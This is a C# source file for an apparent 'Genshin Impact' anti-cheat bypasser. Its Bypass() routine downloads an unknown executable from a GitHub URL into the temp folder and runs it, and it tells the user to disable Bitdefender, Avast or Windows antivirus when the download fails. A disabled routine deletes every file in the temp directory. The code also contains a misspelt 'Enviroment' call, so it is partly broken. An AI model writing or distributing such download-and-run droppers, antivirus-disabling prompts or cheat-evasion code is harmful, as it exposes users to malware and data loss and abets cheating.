using System;
using System.CodeDom.Compiler;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;

namespace Bypasser_Mhyprot2
{
    public class Program
    {
        static void Bypass()
        {
            bool Program = false;
            try
            {
                //credit to DesirePro(FUCK#9803)
                WebClient webClient = new WebClient();
                webClient.DownloadFile(new Uri("https://github.com/DeftSolutions-dev/HackGenshin/raw/main/FuckYou/ggAC.exe"), Path.Combine(Path.GetTempPath(), "Bypass.exe"));
                if (File.Exists(Path.Combine(Path.GetTempPath(), "Bypass.exe")) && new FileInfo(Path.Combine(Path.GetTempPath(), "Bypass.exe")).Length > 10L)
                {
                    Program = true;
                }
                else
                {
                    string msg_1 = "Turn Off Other Anti Virus";
                    string msg_2 = "Bitdefender, Avast, Windows's Anti Virus";
                    Console.WriteLine("Please Turn Off Anti-Virus");
                    Console.WriteLine("");
                    Console.WriteLine("Check If These Are Active -");
                    Console.WriteLine(msg_1 + msg_2);
                    Console.ReadKey();
                }
                if (Program)
                {
                    Process.Start(Path.Combine(Path.GetTempPath(), "Bypass.exe"));
                }
            }
            catch (WebException)
            {
                Console.WriteLine("No Internet Connection Detected, Please Try Again...");
                Console.Beep();
                Thread.Sleep(100);
            }
            catch (Exception arg)
            {
                Console.WriteLine("Oops Somehing Went Wrong!" + arg);
            }
        }
        private static void RandomName()
        {
            Console.Title = "";
            Random rnd = new Random();
            Char[] pwdChars = new Char[62]
            {   'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
                'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
                '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'
            };
            for (int r = 35; r < 75; r++)
                Console.Title += pwdChars[rnd.Next(0, 60)];
            Thread.Sleep(10);
        }
        const string Chars = "awdauUWHU2Dw722322tyuawDawwGG3hwd";
        static string RandomString(int length)
        {
            Random random = new Random();
            return new string(Enumerable.Repeat(Chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
        }
        [STAThread]
        [DebuggerNonUserCode]
        [GeneratedCode("PresentationBuildTasks", "1.2.0.0")]
        public static void Main(string[] args)
        {
            RandomName();
            if (Process.GetProcessesByName("GenshinImpact").Length != 0)
            {
                Bypass();
                Console.WriteLine("Bypassing Genshin Anti Cheat...");
                Console.WriteLine("Closing Mhyprot2... Wait....");
                Thread.Sleep(10);
                Console.Clear();
                Console.WriteLine("Bypassed");
                Console.Beep();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine(" credit to DesirePro(FUCK#9803) ");
                Console.WriteLine(" Made By Dwaine#0572 ");
                Console.ReadLine();
                LoadFile();
                return;
            }

            if (Process.GetProcessesByName("GenshinImpact").Length == 0)
            {
                int i = 0;
                while (i < 5)
                {
                    RandomName();
                    i++;
                }
                using (Process process = Process.Start("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Genshin Impact\\Genshin Impact.lnk"))
                {
                    process.WaitForInputIdle();
                    Console.WriteLine("Launcher.exe PID : " + process.Id);
                    Process[] processCollection = Process.GetProcesses();
                    Console.WriteLine("Wait While The Program Is Listening To Process");
                    Console.WriteLine();
                    foreach (Process p in processCollection)
                    {
                        Console.WriteLine(p.ProcessName);

                    }
                    String[] sentences =
                    {
                        "Genshin Impact",
                        "GenshinImpact",
                        "Genshin Impact.exe",
                        "GenshinImpact.exe"
                    };
                    foreach (string s in sentences)
                    {
                        if (Process.GetProcessesByName("GenshinImpact").Length != 0)
                        {
                            Console.WriteLine("Process Found...");
                        }
                        else
                        {
                            Console.WriteLine("Process Not Found...");
                        }
                    }
                }
            }

            RandomName();
            Console.WriteLine("Cannot Bypass...");
            Console.WriteLine("Open Genshin Impact");
            Thread.Sleep(100);
            Console.Clear();
            Console.Beep();
            Console.WriteLine("Instruction : ");
            Console.WriteLine("");
            Console.WriteLine("Load Into The Game Completely");
            Console.WriteLine("Reopen This Bypasser");
            Console.Clear();
            Console.WriteLine("Wait While The Program Is Listening To Process");
            Console.WriteLine("Opened Luncher For You...");
            Console.WriteLine();
            Console.WriteLine("Load The Game Completely and Open This Bypasser");
            Console.WriteLine("Beep Sound = Succesfully Bypassed");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("Process ID Of Genshin Impact Cannot Found... ");
            Thread.Sleep(10);
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("credit to DesirePro(FUCK#9803)");
            Console.WriteLine("Made By Dwaine#0572");
            Console.WriteLine();
            Thread.Sleep(10000);
            Console.Clear();



            for (int a = 5; a >= 0; a--)
            {
                Console.Write("\rClosing Program in {0:00}", a);
                System.Threading.Thread.Sleep(1000);
                Console.WriteLine();
                Console.WriteLine("credit to DesirePro(FUCK#9803)");
                Console.WriteLine("Made By Dwaine#0572");
            }
            Environment.Exit(1);
            Console.ReadKey();
        }

        private static void LoadFile()
        {
            bool DelProg = false;
            if (DelProg)
            {
                try
                {
                    File.Delete(Path.Combine(Path.GetTempPath(), "Bypass.exe"));
                    var tmpPath = Path.GetTempPath();
                    var files = Directory.GetFiles(tmpPath, "*.*", SearchOption.AllDirectories);
                    foreach (var file in files)
                    {
                        if (File.Exists(file))
                        {
                            File.Delete(file);
                        }
                    }
                }
                catch
                {
                    File.Delete(Path.Combine(Path.GetTempPath(), "Bypass.exe"));
                    Console.WriteLine("Something Went Wrong !, No Big Deal...");
                    Enviroment.Exit(1);
                }
            }
        }
    }
}
